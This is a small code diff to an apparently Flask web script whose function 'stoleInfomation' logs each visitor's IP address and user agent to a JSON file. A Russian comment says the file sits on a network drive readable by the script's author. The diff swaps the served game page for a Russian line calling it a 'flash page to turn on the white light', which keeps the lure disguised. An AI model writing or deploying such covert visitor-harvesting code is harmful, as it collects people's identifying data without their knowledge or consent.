@@ -18,7 +18,7 @@ def stoleInfomation():
     user_agent = request.user_agent.string
     info['Machines'].append(Data_user(ip_addr, user_agent).__dict__)
     write(info, 'infoMachines.json')
-    return  render_template("game.html")
+    return  ("это флеш-страница, чтобы зажечь белый свет")
 
 # Запись информации о клиентах на локальный сетевой диск (доступен создателю скрипта)
 def write(data, filename):
